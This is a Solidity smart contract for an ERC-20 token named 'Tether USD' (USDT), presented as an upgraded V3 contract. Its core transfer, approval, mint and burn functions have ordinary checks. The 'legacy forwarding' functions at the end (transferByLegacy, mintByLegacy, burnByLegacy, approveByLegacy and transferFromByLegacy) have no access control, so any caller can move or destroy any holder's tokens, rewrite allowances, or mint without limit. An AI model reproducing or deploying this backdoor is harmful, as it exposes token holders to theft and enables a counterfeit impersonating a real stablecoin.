pragma solidity ^0.4.17;

/**
 * @title SafeMath
 * @dev Math operations with safety checks that revert on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

/**
 * @title TetherTokenV3
 * @notice Upgraded contract compatible with TetherTokenV2 forwarding
 */
contract TetherTokenV3 {
    using SafeMath for uint256;

    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;

    address public owner;
    uint256 public totalSupply;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowed;

    // --- Events ---
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 value);
    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // --- Modifiers ---
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    // --- Constructor ---
    function TetherTokenV3() public {
        owner = msg.sender;
    }

    // --- ERC-20 Core ---
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(balances[msg.sender] >= _value);

        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);

        Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        uint256 _allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && _allowance >= _value);

        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = _allowance.sub(_value);

        Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    // --- Minting & Burning ---
    function mint(address _to, uint256 _amount) public onlyOwner returns (bool) {
        require(_to != address(0));
        balances[_to] = balances[_to].add(_amount);
        totalSupply = totalSupply.add(_amount);
        Mint(_to, _amount);
        Transfer(address(0), _to, _amount);
        return true;
    }

    function burn(address _from, uint256 _amount) public onlyOwner returns (bool) {
        require(balances[_from] >= _amount);
        balances[_from] = balances[_from].sub(_amount);
        totalSupply = totalSupply.sub(_amount);
        Burn(_from, _amount);
        Transfer(_from, address(0), _amount);
        return true;
    }

    // --- Ownership ---
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    // --- Legacy Forwarding Compatibility ---
    function transferByLegacy(address from, address to, uint256 value) external returns (bool) {
        require(to != address(0));
        require(balances[from] >= value);

        balances[from] = balances[from].sub(value);
        balances[to] = balances[to].add(value);
        Transfer(from, to, value);
        return true;
    }

    function transferFromByLegacy(address spender, address from, address to, uint256 value) external returns (bool) {
        require(to != address(0));
        uint256 _allowance = allowed[from][spender];
        require(balances[from] >= value && _allowance >= value);

        balances[from] = balances[from].sub(value);
        balances[to] = balances[to].add(value);
        allowed[from][spender] = _allowance.sub(value);

        Transfer(from, to, value);
        return true;
    }

    function approveByLegacy(address from, address spender, uint256 value) external returns (bool) {
        allowed[from][spender] = value;
        Approval(from, spender, value);
        return true;
    }

    function mintByLegacy(address to, uint256 amount) external returns (bool) {
        require(to != address(0));
        balances[to] = balances[to].add(amount);
        totalSupply = totalSupply.add(amount);
        Mint(to, amount);
        Transfer(address(0), to, amount);
        return true;
    }

    function burnByLegacy(address from, uint256 amount) external returns (bool) {
        require(balances[from] >= amount);
        balances[from] = balances[from].sub(amount);
        totalSupply = totalSupply.sub(amount);
        Burn(from, amount);
        Transfer(from, address(0), amount);
        return true;
    }
}
